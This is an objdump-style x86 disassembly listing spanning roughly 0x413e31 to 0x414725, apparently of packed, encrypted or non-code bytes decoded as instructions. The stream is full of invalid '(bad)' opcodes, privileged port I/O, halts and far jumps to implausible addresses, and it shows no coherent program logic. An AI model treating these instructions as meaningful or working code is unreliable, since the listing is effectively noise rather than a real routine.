  413e31:	repz les ebp,FWORD PTR [edi-0x4c183140]
  413e38:	jmp    0xc9cf:0xecbac8cc
  413e3f:	fnstcw WORD PTR [esi-0x2e010eff]
  413e45:	in     eax,0xf7
  413e47:	add    dl,ch
  413e49:	add    BYTE PTR [ecx+ecx*8],al
  413e4c:	out    0xb,eax
  413e4e:	(bad)  
  413e50:	out    dx,eax
  413e51:	shrd   ecx,edx,0xc0
  413e55:	int    0xe0
  413e57:	in     eax,0xbb
  413e59:	rol    esp,1
  413e5b:	out    0xbb,eax
  413e5d:	repnz aad 0xd7
  413e60:	div    ecx
  413e62:	iret   
  413e63:	repz hlt 
  413e65:	sar    ebp,0xda
  413e68:	shr    bl,1
  413e6a:	fcmovnb st,st(6)
  413e6c:	or     cl,bh
  413e6e:	out    dx,al
  413e6f:	hlt    
  413e70:	add    DWORD PTR ds:0xe4d2a9e8,ecx
  413e76:	cmc    
  413e77:	shl    esp,0xc0
  413e7a:	sar    ebx,0xd8
  413e7d:	call   0xfb19fa54
  413e82:	loopne 0x413e67
  413e84:	shl    bl,cl
  413e86:	out    0xfa,al
  413e88:	fst    st(6)
  413e8a:	icebp  
  413e8b:	std    
  413e8c:	in     eax,0xff
  413e8e:	cld    
  413e8f:	fcomp  st(0)
  413e91:	add    bl,cl
  413e93:	repz leave 
  413e95:	shl    bh,1
  413e97:	shr    cl,1
  413e99:	int    0xef
  413e9b:	into   
  413e9c:	lods   eax,DWORD PTR ds:[esi]
  413e9d:	in     al,0xfe
  413e9f:	call   0xe32e1d87
  413ea4:	repnz out 0xf5,al
  413ea7:	add    ebx,ecx
  413ea9:	mov    eax,0xf4d70bbf
  413eae:	(bad)  
  413eb0:	or     ebp,edx
  413eb2:	mov    ecx,0xc4e1d1c9
  413eb8:	ret    
  413eb9:	in     al,dx
  413eba:	in     eax,0xcd
  413ebc:	mov    cl,0xf5
  413ebe:	iret   
  413ebf:	stc    
  413ec0:	cld    
  413ec1:	mov    ecx,0xe0d6bacc
  413ec6:	shl    edi,1
  413ec8:	aad    0x3
  413eca:	cmc    
  413ecb:	(bad)
  413ece:	in     eax,0xc6
  413ed0:	iret   
  413ed1:	cld    
  413ed2:	mov    esp,0xf7cce8f2
  413ed7:	jmp    0xf52d13be
  413edc:	out    dx,al
  413edd:	jmp    0xd83438a0
  413ee2:	fcmovnbe st,st(6)
  413ee4:	pop    es
  413ee5:	mov    esi,0xc1dbc4f3
  413eea:	aad    0xdd
  413eec:	hlt    
  413eed:	add    al,0xef
  413eef:	hlt    
  413ef0:	sti    
  413ef1:	fcmovb st,st(0)
  413ef3:	into   
  413ef4:	repz repz leave 
  413ef7:	xlat   BYTE PTR ds:[ebx]
  413ef8:	xlat   BYTE PTR ds:[ebx]
  413ef9:	sti    
  413efa:	sti    
  413efb:	shl    cl,cl
  413efd:	in     eax,0xfe
  413eff:	retf   
  413f00:	cld    
  413f01:	icebp  
  413f02:	jecxz  0x413edb
  413f04:	fild   DWORD PTR ds:0xd8dbbee7
  413f0a:	jecxz  0x413ee3
  413f0c:	add    cl,bh
  413f0e:	push   es
  413f0f:	out    dx,eax
  413f10:	fdivp  st(4),st
  413f12:	fst    st(3)
  413f14:	mul    bl
  413f16:	aad    0xe5
  413f18:	out    0xfa,eax
  413f1a:	(bad)  
  413f1b:	test   cl,0xde
  413f1e:	icebp  
  413f1f:	add    ecx,ebp
  413f21:	repz into 
  413f23:	out    dx,al
  413f24:	cmc    
  413f25:	cli    
  413f26:	(bad)  
  413f28:	mov    ebp,0xd6dfd001
  413f2d:	out    dx,eax
  413f2e:	cmc    
  413f2f:	push   es
  413f30:	cli    
  413f31:	fnstsw WORD PTR [ebp-0x3f120810]
  413f37:	mov    ah,0xcf
  413f39:	in     al,dx
  413f3a:	rcl    edi,cl
  413f3c:	push   esi
  413f3e:	jmp    0xcfda:0xbefafedd
  413f45:	add    ah,ch
  413f47:	add    esp,ecx
  413f49:	icebp  
  413f4a:	cli    
  413f4b:	add    bl,bl
  413f4d:	test   bl,0xe
  413f50:	jmp    0xbdef:0xc7f3d3e4
  413f57:	(bad)  
  413f58:	retf   
  413f59:	retf   0xe8fa
  413f5c:	fcmove st,st(3)
  413f5e:	iret   
  413f5f:	mov    esi,0xced5d0b9
  413f64:	jecxz  0x413f39
  413f66:	std    
  413f67:	rcl    ah,cl
  413f69:	lock or ebx,edi
  413f6c:	les    eax,FWORD PTR ds:0xc0c8ecc3
  413f72:	shr    DWORD PTR [eax+esi*8-0xf122d19],1
  413f79:	fincstp 
  413f7b:	(bad)  
  413f7c:	not    ch
  413f7e:	cli    
  413f7f:	add    ebx,ebp
  413f81:	ret    0xc3ed
  413f84:	(bad)  
  413f85:	test   ebp,0xaf6dcd3
  413f8b:	retf   
  413f8c:	add    bh,bh
  413f8e:	(bad)  
  413f8f:	(bad)  [eax+eiz*8]
  413f92:	fyl2x  
  413f94:	mov    esi,0xcccecacb
  413f99:	shl    ah,cl
  413f9b:	(bad)  
  413f9d:	call   0xf0110e5a
  413fa2:	(bad)  
  413fa4:	stc    
  413fa5:	add    ah,ch
  413fa7:	sar    BYTE PTR [esi+edi*8-0x1a14fe26],0xfa
  413faf:	or     dl,dh
  413fb1:	int3   
  413fb2:	loope  0x413f7a
  413fb4:	retf   0xceb7
  413fb7:	mov    ah,0xb7
  413fb9:	out    dx,al
  413fba:	cmc    
  413fbb:	mov    cl,0xf8
  413fbd:	in     eax,dx
  413fbe:	fdivr  DWORD PTR [ebp-0x3d260f09]
  413fc4:	rcr    eax,1
  413fc6:	(bad)  
  413fc8:	cmc    
  413fc9:	cli    
  413fca:	les    eax,FWORD PTR ds:0xe5c9e5e5
  413fd0:	in     al,0xec
  413fd2:	out    0xa9,al
  413fd4:	jmp    0xeff1fd81
  413fd9:	mov    ch,0xe7
  413fdb:	call   0xfd3e10b7
  413fe0:	shl    dl,cl
  413fe2:	loop   0x413fd2
  413fe4:	in     eax,dx
  413fe5:	loop   0x413fbf
  413fe7:	sar    cl,cl
  413fe9:	mul    dh
  413feb:	fucomp st(1)
  413fed:	fmul   st(7),st
  413fef:	stc    
  413ff0:	loop   0x413fd3
  413ff2:	loope  0x413fa1
  413ff4:	call   0xd30b37cf
  413ff9:	int3   
  413ffa:	aam    0xb9
  413ffc:	mov    ch,0xce
  413ffe:	jmp    0xe0c2:0xbcf1d1ce
  414005:	fdiv   st,st(1)
  414007:	(bad)  
  414009:	lock add BYTE PTR [eax],al
  41400c:	fcomi  st,st(6)
  41400e:	hlt    
  41400f:	in     eax,dx
  414010:	jmp    0x413fe4
  414012:	repnz in al,0xdc
  414015:	call   0xed3315c7
  41401a:	shl    esp,cl
  41401c:	jmp    0xfcda:0xc9dbf7d9
  414023:	mov    dh,0xf8
  414025:	loopne 0x414005
  414027:	stc    
  414028:	add    DWORD PTR [ecx],ecx
  41402a:	push   es
  41402b:	rol    BYTE PTR ds:0xedcfdee4,0xed
  414032:	scas   al,BYTE PTR es:[edi]
  414033:	stos   BYTE PTR es:[edi],al
  414034:	shl    DWORD PTR [edx-0x2f1d334b],0xd9
  41403b:	mov    edx,0xb6eadff8
  414040:	fstp   st(2)
  414042:	into   
  414043:	shr    esp,cl
  414045:	int3   
  414046:	ror    BYTE PTR [ebx],0xea
  414049:	ret    0xe8db
  41404c:	enter  0xfbc,0xe
  414050:	(bad)  
  414053:	in     eax,0xc2
  414055:	ret    0xe0e0
  414058:	retf   0xf5f4
  41405b:	hlt    
  41405c:	in     al,0xf5
  41405e:	shl    ebp,cl
  414060:	clc    
  414061:	into   
  414062:	xlat   BYTE PTR ds:[ebx]
  414063:	ret    
  414064:	rol    edx,1
  414066:	in     eax,0xc2
  414068:	repz or edx,eax
  41406b:	fadd   st,st(1)
  41406d:	aad    0xef
  41406f:	hlt    
  414070:	(bad)
  414073:	lds    edi,FWORD PTR [esi-0x370d4f58]
  414079:	mov    cl,0xd4
  41407b:	retf   
  41407c:	mov    eax,0xcec4b9cc
  414081:	cli    
  414082:	sti    
  414083:	add    bh,dh
  414085:	test   BYTE PTR [ebx],0xd3
  414088:	cmc    
  414089:	jmp    0xe104:0x6d9d405
  414090:	fist   DWORD PTR [ebx]
  414092:	jmp    0xc226086f
  414097:	aad    0xc0
  414099:	retf   0xd9fa
  41409c:	jmp    0xfbde:0xd2f0cafd
  4140a3:	out    0xdd,eax
  4140a5:	lock mov esi,0xcbdcffd1
  4140ab:	out    0xe,al
  4140ad:	sti    
  4140ae:	loop   0x4140bf
  4140b0:	(bad)
  4140b3:	mov    esi,0xaae0acec
  4140b8:	shl    BYTE PTR [edx-0x9244e14],0xcb
  4140bf:	sti    
  4140c0:	idiv   cl
  4140c2:	add    BYTE PTR [ecx-0x82514],bh
  4140c8:	retf   
  4140c9:	fcmovnbe st,st(0)
  4140cb:	(bad)  
  4140cd:	jmp    0xff1e4ddb
  4140d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140d3:	out    dx,eax
  4140d4:	les    ebp,FWORD PTR [esi-0x311d283d]
  4140da:	jmp    0x4140b0
  4140dc:	(bad)  
  4140dd:	in     eax,dx
  4140de:	in     al,0xe3
  4140e0:	mov    cl,0xdd
  4140e2:	inc    dl
  4140e4:	mov    ebp,0xc0e5d7da
  4140e9:	shr    bl,0x9
  4140ec:	or     bl,bh
  4140ee:	jmp    0xc3d1:0xf308c802
  4140f5:	fadd   st(2),st
  4140f7:	(bad)  
  4140fa:	(bad)  
  4140fb:	loopne 0x4140fb
  4140fd:	(bad)  
  4140fe:	lock in eax,dx
  414100:	sti    
  414101:	iret   
  414102:	mov    ebx,0xbcde07ee
  414107:	fsub   st,st(6)
  414109:	aad    0xcb
  41410b:	call   0xd92816f9
  414110:	add    al,0xe
  414112:	mov    ecx,0xb3afc8e6
  414117:	fcmovnb st,st(6)
  414119:	loop   0x4140fb
  41411b:	icebp  
  41411c:	mov    al,0xcb
  41411e:	fucomi st,st(7)
  414120:	enter  0xe2ce,0xf3
  414124:	rol    DWORD PTR [eax],1
  414126:	ret    
  414127:	fdiv   st,st(6)
  414129:	or     al,ah
  41412b:	aad    0xa
  41412d:	(bad)  
  41412f:	stc    
  414130:	out    dx,eax
  414131:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414133:	test   al,0xcf
  414135:	shl    dl,0xc5
  414138:	int    0xbb
  41413a:	sti    
  41413b:	fdivr  DWORD PTR [ecx-0x37fc1036]
  414141:	fidivr DWORD PTR [ecx-0x38202048]
  414147:	mov    edx,0xf900f4c3
  41414c:	neg    cl
  41414e:	in     eax,dx
  41414f:	jmp    0xe5ae:0xcbcde208
  414156:	loope  0x41410a
  414158:	mov    ah,0xe7
  41415a:	jmp    0xbf32145a
  41415f:	int    0xfe
  414161:	aad    0xdc
  414163:	repz add bl,bl
  414166:	in     eax,0xde
  414168:	shl    al,1
  41416a:	neg    ah
  41416c:	test   ah,0xe5
  41416f:	call   0xf1ee2f4d
  414174:	mov    ebp,0xc6d0eee6
  414179:	int    0xd4
  41417b:	int    0xf7
  41417d:	imul   ah
  41417f:	jmp    0x414144
  414181:	std    
  414182:	out    dx,al
  414183:	sti    
  414184:	out    dx,al
  414185:	idiv   BYTE PTR [edi-0x63d21fe]
  41418b:	retf   
  41418c:	cli    
  41418d:	or     eax,0xe0dfe3ec
  414192:	into   
  414193:	fsubr  QWORD PTR [ebp-0x300d0b52]
  414199:	shl    BYTE PTR [ebx+esi*8-0x422d2401],cl
  4141a0:	add    ch,dl
  4141a2:	jmp    0xde10379a
  4141a7:	fcompp 
  4141a9:	add    ch,bl
  4141ab:	jmp    0xe3dc:0x13c3dbf6
  4141b2:	jmp    0x414196
  4141b4:	(bad)  
  4141b6:	test   ebx,0xebeaacce
  4141bc:	call   0xdb2d3d90
  4141c1:	mov    ebp,0xcccef8ef
  4141c6:	sti    
  4141c7:	push   es
  4141c8:	cli    
  4141c9:	loope  0x4141bb
  4141cb:	add    eax,0xf4ec0be5
  4141d0:	repz add esp,ecx
  4141d3:	test   eax,0xd2cac9c7
  4141d8:	lods   eax,DWORD PTR ds:[esi]
  4141d9:	jmp    0xd3d0:0xfbdfcbf4
  4141e0:	mov    cl,0xfc
  4141e2:	mov    ebp,0xece5c3f0
  4141e7:	lock fst st(2)
  4141ea:	out    0xdb,al
  4141ec:	pop    es
  4141ed:	hlt    
  4141ee:	jmp    0xf1e1:0xa713000a
  4141f5:	jmp    0xfc220fad
  4141fa:	mov    bh,0xcb
  4141fc:	mov    ebx,0xd7f3febe
  414201:	repz std 
  414203:	ret    
  414204:	mov    ecx,0xddf5e6c7
  414209:	(bad)  
  41420b:	idiv   al
  41420d:	iret   
  41420e:	(bad)  
  414210:	fucomp st(2)
  414212:	int    0xc6
  414214:	int    0xf6
  414216:	mov    bh,0xf1
  414218:	mov    ebx,0xd5ebe1e6
  41421d:	lods   al,BYTE PTR ds:[esi]
  41421e:	stc    
  41421f:	fistp  QWORD PTR [eax-0x2d323727]
  414225:	aam    0xe4
  414227:	(bad)  
  414228:	sar    ah,cl
  41422a:	add    eax,0xdad6d505
  41422f:	(bad)  
  414231:	out    dx,eax
  414232:	fidiv  WORD PTR [eax-0x33533232]
  414238:	int3   
  414239:	retf   
  41423a:	fdiv   DWORD PTR [edx-0x47072705]
  414240:	mov    ecx,0xded7deff
  414245:	mov    edi,0xfad2ebbe
  41424a:	rol    DWORD PTR [edi],0xca
  41424d:	(bad)  
  41424e:	fucom  st(5)
  414250:	add    DWORD PTR [ecx+ebx*8],eax
  414253:	jmp    0x41421b
  414255:	mov    bh,0xc4
  414257:	mov    ah,0xb6
  414259:	lock in al,dx
  41425b:	aam    0xf8
  41425d:	jmp    0xc1f0:0xe2cdfac9
  414264:	push   es
  414265:	int    0xf8
  414267:	sti    
  414268:	(bad)
  41426c:	or     cl,ah
  41426e:	aam    0xd
  414270:	(bad)  
  414272:	retf   
  414273:	rol    eax,1
  414275:	aad    0xc5
  414277:	mov    dl,0xee
  414279:	shr    esi,cl
  41427b:	mov    ah,0xb6
  41427d:	in     al,0xdc
  41427f:	into   
  414280:	hlt    
  414281:	in     eax,dx
  414282:	mov    eax,0xbedc01d0
  414287:	(bad)  
  414289:	mov    DWORD PTR [ecx],0xeb07c909
  41428f:	std    
  414290:	out    dx,al
  414291:	jmp    0xcb12ef80
  414296:	int    0xb4
  414298:	cmc    
  414299:	(bad)  
  41429a:	fcomi  st,st(2)
  41429c:	in     eax,0xca
  41429e:	(bad)  
  41429f:	mov    esp,0xd200bb02
  4142a4:	xlat   BYTE PTR ds:[ebx]
  4142a5:	hlt    
  4142a6:	in     eax,0xc6
  4142a8:	hlt    
  4142a9:	repnz pop es
  4142ab:	sti    
  4142ac:	add    ecx,edx
  4142ae:	aam    0xe4
  4142b0:	jmp    0xa6291abb
  4142b5:	loop   0x4142aa
  4142b7:	out    0xf4,al
  4142b9:	mov    dl,0xc7
  4142bb:	mov    ch,0xe6
  4142bd:	mov    eax,0xeed1ebf0
  4142c2:	rol    edx,0xe0
  4142c5:	xlat   BYTE PTR ds:[ebx]
  4142c6:	out    0x4,al
  4142c8:	(bad)  
  4142c9:	aad    0xf4
  4142cb:	or     esi,ebp
  4142cd:	add    eax,0x808c5f9
  4142d2:	leave  
  4142d3:	out    0xbc,al
  4142d5:	repnz leave 
  4142d7:	iret   
  4142d8:	shl    dh,0xec
  4142db:	mov    ch,0xee
  4142dd:	cli    
  4142de:	jmp    0xe2ff:0xf6f8f1f6
  4142e5:	int    0xc2
  4142e7:	in     al,dx
  4142e8:	xlat   BYTE PTR ds:[ebx]
  4142e9:	(bad)  
  4142ea:	jmp    0x4142f1
  4142ec:	add    BYTE PTR [esi],al
  4142ee:	retf   0xee0a
  4142f1:	or     ecx,edx
  4142f3:	jmp    0xe2c3:0xcef4e8e7
  4142fa:	les    esi,FWORD PTR [edx-0x170521]
  414300:	rol    ebx,1
  414302:	cli    
  414303:	lock frndint 
  414306:	loopne 0x4142ed
  414308:	or     bl,al
  41430a:	add    cl,bl
  41430c:	(bad)  
  41430d:	fdivr  st,st(0)
  41430f:	loope  0x41431d
  414311:	cli    
  414312:	(bad)  
  414313:	repz jmp 0xd9b0:0xd0e5c5d7
  41431b:	stc    
  41431c:	mov    ah,0xc5
  41431e:	fucomi st,st(2)
  414320:	icebp  
  414321:	fmulp  st(1),st
  414323:	repz mov eax,0xe2da05f7
  414329:	retf   
  41432a:	loop   0x414327
  41432c:	fsqrt  
  41432e:	pop    es
  41432f:	loope  0x414340
  414331:	enter  0xe2cc,0xcd
  414335:	mov    bh,0xdd
  414337:	ror    eax,0xd5
  41433a:	(bad)  
  41433b:	repz mov edx,0xb5fec8ff
  414341:	out    dx,al
  414342:	loopne 0x414334
  414344:	std    
  414345:	fucomp st(4)
  414347:	out    0xc2,eax
  414349:	neg    dh
  41434b:	cld    
  41434c:	(bad)  
  41434d:	mov    esp,0xcddacbde
  414352:	mov    dl,0xe5
  414354:	mov    dl,0xed
  414356:	jecxz  0x41431e
  414358:	mov    ah,0xe4
  41435a:	retf   0xccf4
  41435d:	sti    
  41435e:	(bad)  
  41435f:	in     al,0xd2
  414361:	jmp    0xe71c3025
  414366:	int3   
  414367:	in     al,0xd0
  414369:	add    eax,0x9ddd00b
  41436e:	std    
  41436f:	out    0xe2,al
  414371:	int    0xe5
  414373:	loope  0x414366
  414375:	int3   
  414376:	hlt    
  414377:	mov    dh,0xec
  414379:	mov    cl,0xd3
  41437b:	ror    esp,1
  41437d:	into   
  41437e:	retf   0xdcb2
  414381:	std    
  414382:	mov    ebx,0xbfc203e8
  414387:	cld    
  414388:	fcmovnb st,st(7)
  41438a:	icebp  
  41438b:	fst    st(5)
  41438d:	leave  
  41438e:	add    eax,0xceeac9ce
  414393:	fmulp  st(0),st
  414395:	shl    bh,0xd5
  414398:	jmp    0xe6341183
  41439d:	std    
  41439e:	les    esi,FWORD PTR [ecx+esi*4-0x20233d2d]
  4143a5:	jecxz  0x4143a0
  4143a7:	(bad)  
  4143a9:	(bad)  
  4143ab:	imul   bh
  4143ad:	fsubr  st,st(1)
  4143af:	ffree  st(1)
  4143b1:	loope  0x414391
  4143b3:	retf   
  4143b4:	mov    al,0xf1
  4143b6:	ret    
  4143b7:	mov    ch,0xeb
  4143b9:	int3   
  4143ba:	mov    ah,0xb1
  4143bc:	stc    
  4143bd:	cmc    
  4143be:	rcl    ecx,1
  4143c0:	mov    ch,0xef
  4143c2:	shl    bl,1
  4143c4:	push   es
  4143c5:	(bad)  
  4143c6:	hlt    
  4143c7:	fsubrp st(2),st
  4143c9:	ror    BYTE PTR [edx],1
  4143cb:	enter  0xef02,0xe4
  4143cf:	or     edx,esp
  4143d1:	add    cl,dl
  4143d3:	rol    al,cl
  4143d5:	shl    DWORD PTR [ebp-0x3a09042f],1
  4143db:	clc    
  4143dc:	repnz sti 
  4143de:	fcomp  st(0)
  4143e0:	mov    ebp,0xfcdddbf5
  4143e5:	add    ah,cl
  4143e7:	fdiv   st,st(3)
  4143e9:	xabort 0xb
  4143ec:	hlt    
  4143ed:	fdivr  st,st(2)
  4143ef:	or     al,0xc4
  4143f1:	rcr    esp,cl
  4143f3:	in     eax,dx
  4143f4:	jmp    0xc7ef:0xf0efebb6
  4143fb:	aam    0xd6
  4143fd:	retf   0xbedd
  414400:	into   
  414401:	test   ecx,0xdcd0e302
  414407:	(bad)  
  414409:	ret    
  41440a:	loope  0x4143e3
  41440c:	fisttp WORD PTR ds:0xcd01cce8
  414412:	mov    ebp,0xeedce5ae
  414417:	call   0xeb0c2af6
  41441c:	out    0xbf,eax
  41441e:	div    DWORD PTR [esi-0x410e1e30]
  414424:	ret    
  414425:	call   eax
  414427:	ret    
  414428:	add    al,0xd6
  41442a:	icebp  
  41442b:	ret    0xf6c6
  41442e:	invd   
  414430:	or     bh,ah
  414432:	into   
  414433:	mov    edi,0xd2f7a8e0
  414438:	not    esi
  41443a:	icebp  
  41443b:	retf   
  41443c:	jmp    0xd0c2:0xd3ddfab0
  414443:	sar    DWORD PTR [edi-0x27fe262c],cl
  414449:	add    eax,edi
  41444b:	shr    edi,0xf4
  41444e:	sti    
  41444f:	fadd   QWORD PTR [edx]
  414451:	add    al,0xbf
  414453:	jmp    0xec363546
  414458:	loop   0x41442f
  41445a:	into   
  41445b:	mov    ebx,0xc4cddfbf
  414460:	int3   
  414461:	mov    ecx,0xd0edbefe
  414466:	(bad)  
  414467:	jmp    0x41444e
  414469:	aad    0xe2
  41446b:	(bad)  
  41446c:	jmp    0x414438
  41446e:	pminub mm1,mm2
  414471:	icebp  
  414472:	shl    BYTE PTR [ebx-0x4f331b18],1
  414478:	test   eax,0xede4afe2
  41447d:	mov    ebx,0xd0fbcfdc
  414482:	mov    ebx,0xcdf8eee8
  414487:	out    0xd6,eax
  414489:	mov    esp,0xe2c709fa
  41448e:	in     al,0xe5
  414490:	iret   
  414491:	loope  0x414475
  414493:	out    0xcf,al
  414495:	imul   DWORD PTR [ebx+edx*8-0xb1b360a]
  41449c:	sti    
  41449d:	into   
  41449e:	fmul   st,st(2)
  4144a0:	rcr    ecx,1
  4144a2:	std    
  4144a3:	ret    0xc2f4
  4144a6:	std    
  4144a7:	pop    es
  4144a8:	add    esi,esi
  4144aa:	add    dh,bl
  4144ac:	hlt    
  4144ad:	retf   
  4144ae:	fst    QWORD PTR [ebx]
  4144b0:	int    0xfc
  4144b2:	ret    
  4144b3:	div    eax
  4144b5:	les    edi,FWORD PTR [ebp-0x48103d1d]
  4144bb:	mov    ah,0xcc
  4144bd:	idiv   BYTE PTR [esi-0x1f0a1202]
  4144c3:	(bad)  
  4144c4:	lock xlat BYTE PTR ds:[ebx]
  4144c6:	int    0xf1
  4144c8:	(bad)  
  4144c9:	lock (bad) 
  4144cb:	jmp    0xd8de:0x3ddf909
  4144d2:	shl    DWORD PTR [ebx-0x313c1c2d],cl
  4144d8:	jmp    0xdfc5:0xb9b2b4b7
  4144df:	enter  0xbab9,0xe9
  4144e3:	add    al,dh
  4144e5:	(bad)  
  4144e6:	mov    ebx,0x2e70702
  4144eb:	in     eax,0xdd
  4144ed:	jmp    0x4144ec
  4144ef:	(bad)  
  4144f1:	leave  
  4144f2:	out    0xde,al
  4144f4:	mov    esi,0xedf6c8e1
  4144f9:	mul    esi
  4144fb:	rcr    ebx,1
  4144fd:	(bad)  
  4144fe:	mov    bl,0x3
  414500:	leave  
  414501:	iret   
  414502:	fdivp  st(5),st
  414504:	fidivr WORD PTR [edi+0x60002d1]
  41450a:	fsubp  st(0),st
  41450c:	or     BYTE PTR ds:0xdc02fc06,cl
  414512:	(bad)  
  414513:	in     eax,dx
  414514:	fsubr  st(3),st
  414516:	jmp    0x4144e4
  414518:	in     eax,0xd7
  41451a:	fcmovnbe st,st(4)
  41451c:	in     al,0xb0
  41451e:	mov    ch,0xbf
  414520:	mov    eax,0xddf3b9d3
  414525:	push   es
  414526:	fdivp  st(0),st
  414528:	in     al,0x9
  41452a:	fcmovbe st,st(4)
  41452c:	(bad)  
  41452d:	push   cs
  41452e:	sti    
  41452f:	or     al,0xfb
  414531:	inc    ebp
  414533:	ror    ah,0xd7
  414536:	not    dh
  414538:	mov    dh,0xf5
  41453a:	retf   0xb4f9
  41453d:	lods   al,BYTE PTR ds:[esi]
  41453e:	int3   
  41453f:	mov    ah,0xc8
  414541:	ret    
  414542:	(bad)  
  414544:	ret    
  414545:	cmc    
  414546:	fucomp st(4)
  414548:	cli    
  414549:	(bad)  
  41454a:	cli    
  41454b:	fcmove st,st(3)
  41454d:	or     cl,BYTE PTR ds:0xcfd303ca
  414553:	repnz shl dl,0xbc
  414557:	retf   0xd2cb
  41455a:	jmp    0x41450d
  41455c:	(bad)  
  41455d:	mov    ecx,0xfbd2b2f7
  414562:	not    ecx
  414564:	(bad)  
  414565:	not    ah
  414567:	lock in al,0xf2
  41456a:	(bad)  
  41456b:	rcr    dl,1
  41456d:	push   es
  41456e:	fucomip st,st(0)
  414570:	add    eax,0xe3edbe09
  414575:	mov    cl,0xc4
  414577:	mul    eax
  414579:	stc    
  41457a:	fdivr  st,st(3)
  41457c:	mov    ecx,0xcbf8ccdf
  414581:	icebp  
  414582:	add    bh,BYTE PTR [edx-0x1300422c]
  414588:	ret    
  414589:	(bad)  
  41458a:	mul    ebp
  41458c:	add    DWORD PTR [ebx],ecx
  41458e:	or     eax,0xc9fa0cdb
  414593:	ret    0xf5a8
  414596:	repnz enter 0xf1b5,0xb2
  41459b:	xlat   BYTE PTR ds:[ebx]
  41459c:	enter  0xbec4,0xcf
  4145a0:	fistp  QWORD PTR [eax-0x2b07122a]
  4145a6:	fcomi  st,st(3)
  4145a8:	(bad)  
  4145a9:	loopne 0x41458d
  4145ab:	leave  
  4145ac:	mul    ebp
  4145ae:	or     al,0xc4
  4145b0:	sti    
  4145b1:	std    
  4145b2:	fxch   st(0)
  4145b4:	mov    esp,0xecf6b3bd
  4145b9:	icebp  
  4145ba:	repnz (bad) 
  4145bc:	(bad)  
  4145bd:	cmc    
  4145be:	retf   
  4145bf:	(bad)  
  4145c1:	fnop   
  4145c3:	sti    
  4145c4:	mov    ch,0xe5
  4145c6:	fstp   st(4)
  4145c8:	add    al,0xd5
  4145ca:	out    0xea,eax
  4145cc:	or     ebp,ebp
  4145ce:	or     bh,al
  4145d0:	add    bh,dl
  4145d2:	int3   
  4145d3:	ret    0xcdcc
  4145d6:	imul   dh
  4145d8:	mov    ebx,0xfbe7f7bb
  4145dd:	jmp    0xfe2b04ba
  4145e2:	fistp  QWORD PTR [edx-0x2e083f10]
  4145e8:	mov    esp,0xc806f0e5
  4145ed:	dec    al
  4145ef:	int3   
  4145f0:	in     eax,dx
  4145f1:	out    dx,al
  4145f2:	rcl    dl,1
  4145f4:	loope  0x4145cb
  4145f6:	jmp    0xb222fab0
  4145fb:	rol    dh,0xf2
  4145fe:	mov    ecx,0xfaba03b9
  414603:	mov    ecx,0xe1dfc3c3
  414608:	sti    
  414609:	(bad)  
  41460a:	retf   
  41460b:	(bad)  
  41460c:	or     ecx,DWORD PTR ds:0xc0e5eecf
  414612:	mov    esp,0xe8f5ceec
  414617:	iret   
  414618:	shl    dl,cl
  41461a:	iret   
  41461b:	out    dx,eax
  41461c:	fcomi  st,st(4)
  41461e:	icebp  
  41461f:	(bad)  
  414620:	add    edi,DWORD PTR [eax-0x251d002b]
  414626:	in     eax,dx
  414627:	in     al,dx
  414628:	stc    
  414629:	cli    
  41462a:	stc    
  41462b:	jmp    0xfa432619
  414630:	sti    
  414631:	jmp    0x4145f0
  414633:	ret    0xcac6
  414636:	aam    0xf3
  414638:	mov    ah,0xf2
  41463a:	enter  0xfeb6,0xcd
  41463e:	mov    ch,0xda
  414640:	add    ah,cl
  414642:	iret   
  414643:	cmc    
  414644:	cld    
  414645:	into   
  414646:	add    dl,al
  414648:	or     edi,esp
  41464a:	retf   
  41464b:	fiadd  WORD PTR ds:0xfaeecac6
  414651:	retf   0xe9a8
  414654:	jmp    0x414604
  414656:	shl    BYTE PTR [eax-0x351f1b38],1
  41465c:	mov    ah,0xc8
  41465e:	shl    DWORD PTR [esi-0x17332403],1
  414664:	pop    es
  414665:	(bad)  
  414667:	jmp    0x414630
  414669:	std    
  41466a:	(bad)  
  41466c:	add    al,0x9
  41466e:	hlt    
  41466f:	fiadd  DWORD PTR [eax]
  414671:	shr    bh,cl
  414673:	jmp    0xe614fd3d
  414678:	(bad)  
  414679:	enter  0xcacc,0xe6
  41467d:	xlat   BYTE PTR ds:[ebx]
  41467e:	in     al,dx
  41467f:	leave  
  414680:	sti    
  414681:	ret    
  414682:	hlt    
  414683:	cli    
  414684:	not    edx
  414686:	add    esi,ebx
  414688:	mov    ebp,0xe309c901
  41468d:	mov    esp,0xcfebec0f
  414692:	rcl    edi,cl
  414694:	retf   
  414695:	retf   
  414696:	ret    
  414697:	xlat   BYTE PTR ds:[ebx]
  414698:	mov    ebx,0xd4f9e4b3
  41469d:	mov    esi,0xf9c9b6f5
  4146a2:	jmp    0xc73c1fa6
  4146a7:	shl    al,0xf8
  4146aa:	aam    0xfe
  4146ac:	mov    BYTE PTR [eax],0xd4
  4146af:	retf   
  4146b0:	std    
  4146b1:	or     ah,bl
  4146b3:	enter  0xdee4,0xf1
  4146b7:	test   al,0xe5
  4146ba:	ror    ebx,cl
  4146bc:	mov    eax,0xbdd0d2be
  4146c1:	hlt    
  4146c2:	out    dx,al
  4146c3:	sar    dl,cl
  4146c5:	add    BYTE PTR [edi],al
  4146c7:	mov    esp,0x4e8dbc2
  4146cc:	cmc    
  4146cd:	out    dx,al
  4146ce:	iret   
  4146cf:	fmul   st,st(5)
  4146d1:	retf   0xd3b8
  4146d4:	shl    al,1
  4146d6:	ret    
  4146d7:	hlt    
  4146d8:	ret    0xc8ee
  4146db:	retf   0xfdd4
  4146de:	test   esp,0xfab8bed8
  4146e4:	fdivr  DWORD PTR [esp+edx*8-0x2507f4ff]
  4146eb:	add    al,0xe2
  4146ed:	cld    
  4146ee:	mov    BYTE PTR [ecx],0xca
  4146f1:	add    ebx,eax
  4146f3:	jmp    0x4146c8
  4146f5:	lock in al,0xf7
  4146f8:	idiv   BYTE PTR [ebx-0x49162c05]
  4146fe:	fsubp  st(4),st
  414700:	mul    bl
  414702:	int3   
  414703:	call   0xed2f04c4
  414708:	bnd ret 0xbec2
  41470c:	add    DWORD PTR [eax],eax
  41470e:	in     al,0xcd
  414710:	shl    ecx,0xe8
  414713:	in     eax,dx
  414714:	loopne 0x4146dd
  414716:	mul    ecx
  414718:	fcmovne st,st(7)
  41471a:	scas   eax,DWORD PTR es:[edi]
  41471b:	rcr    dl,0xac
  41471e:	mov    ecx,0xeeeeeaf1
  414723:	aad    0xe3
  414725:	aam    0x6
